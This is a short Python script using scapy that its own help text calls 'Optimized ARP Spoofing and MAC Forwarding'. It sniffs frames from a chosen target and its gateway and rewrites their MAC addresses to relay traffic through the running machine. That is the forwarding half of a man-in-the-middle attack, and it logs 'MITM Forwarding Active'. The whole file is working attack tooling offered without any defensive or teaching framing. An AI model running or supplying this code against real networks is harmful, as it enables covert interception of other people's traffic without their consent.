from scapy.all import sendp, sniff, Ether, IP, get_if_hwaddr
import argparse
import logging

# Setup optimized logging (reduce overhead)
logging.basicConfig(format='[%(asctime)s] %(message)s', level=logging.INFO)

# Command-line arguments
parser = argparse.ArgumentParser(description="Optimized ARP Spoofing and MAC Forwarding")
parser.add_argument("--target_mac", required=True, help="Target MAC address")
parser.add_argument("--gateway_mac", required=True, help="Gateway MAC address")
parser.add_argument("--target_ip", required=True, help="Target IP address")
parser.add_argument("--gateway_ip", required=True, help="Gateway IP address")
parser.add_argument("--interface", default="Wi-Fi", help="Network interface name")
args = parser.parse_args()

INTERFACE = args.interface
MAC_A = args.target_mac
MAC_B = args.gateway_mac
IP_A = args.target_ip
IP_B = args.gateway_ip
OWN_MAC = get_if_hwaddr(INTERFACE)

logging.info(f"Listening on {INTERFACE} | Target: {IP_A} ({MAC_A}) <-> Gateway: {IP_B} ({MAC_B})")

def forward_packet(packet):
    """Optimized forwarding of packets between target and gateway."""
    if packet[Ether].src == MAC_A:  # From Target -> Gateway
        packet[Ether].src = OWN_MAC
        packet[Ether].dst = MAC_B
        sendp(packet, iface=INTERFACE, verbose=False)

    elif packet[Ether].src == MAC_B:  # From Gateway -> Target
        packet[Ether].src = OWN_MAC
        packet[Ether].dst = MAC_A
        sendp(packet, iface=INTERFACE, verbose=False)

# Efficient sniffing with BPF filter (reduces unnecessary packet processing)
logging.info("MITM Forwarding Active...")
sniff(iface=INTERFACE, prn=forward_packet, filter="ether src {} or ether src {}".format(MAC_A, MAC_B), store=0)
